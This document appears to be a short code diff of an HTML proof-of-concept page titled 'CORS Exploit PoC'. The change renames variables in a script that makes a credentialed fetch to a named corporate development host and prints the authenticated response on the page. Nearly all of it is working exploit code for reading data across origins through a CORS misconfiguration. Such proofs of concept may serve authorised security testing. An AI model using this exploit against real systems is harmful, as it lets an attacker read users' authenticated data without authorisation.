@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>🔥 CORS PoC</h1>
+    <h1>🔥 CORS Exploit PoC</h1>
     <script>
       fetch("https://dq-testing-dev.corp.afterpay.com", {
         method: "GET",
         credentials: "include"
       })
-      .then(response => response.text())
-      .then(data => {
-        document.body.innerHTML += "<pre>" + data + "</pre>";
+      .then(res => res.text())
+      .then(html => {
+        document.body.innerHTML += "<pre>" + html + "</pre>";
       })
       .catch(err => {
         document.body.innerHTML += "<pre style='color:red'>" + err + "</pre>";
